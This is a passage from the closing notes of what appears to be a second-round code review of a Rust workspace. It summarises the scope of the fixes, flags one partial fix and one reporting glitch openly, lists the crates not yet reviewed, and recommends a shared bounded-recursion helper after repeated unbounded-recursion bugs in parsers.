edits. One deliberately-scoped exception: finding 16's fix (`rusty_bincode`
serialize signature change) required updating its one call site in
`rusty_boot`, verified separately with `cargo check -p rusty_boot`.

One architecturally-bounded partial fix (finding 8, part 1) and one
harness-level reporting glitch (finding 36-37's fix task) are called out
explicitly in Disposition rather than silently marked "fixed" — both are
independently confirmed sound, not swept under a blanket status.

This pass covered 14 additional crate-family groups; it is not exhaustive
of the remaining workspace surface. Round 2's own closing note already
identified `rusty_provider`'s `cli` crate (reviewed this round, sound) and
`ts-derp`/`ts-stun`/`ts-disco` (now covered) as its follow-up list, which
this round closes out. Areas not yet touched at this review's depth
include: the ~85 remaining top-level crate families not named in either
round's scope notes (most are thin, well-tested utility crates per this
round's scouts' sampling), the full `rusty_search`/`rusty_meshed`/
`rusty_yirp` product families beyond round 2's coverage, and a genuine
fuzz-testing pass (as opposed to static/targeted-input review) across the
several hand-rolled parsers this round and round 2 both found had
unbounded-recursion bugs — a recurring pattern (`rusty_jinja`, `nexus-
database`, `rusty_codec::toml`, `rusty_llama::grammar`, `rusty_text::awk`)
suggesting a shared, reusable bounded-recursion-descent helper across this
workspace's several from-scratch parser crates would be higher-leverage
than continuing to fix each occurrence one at a time.
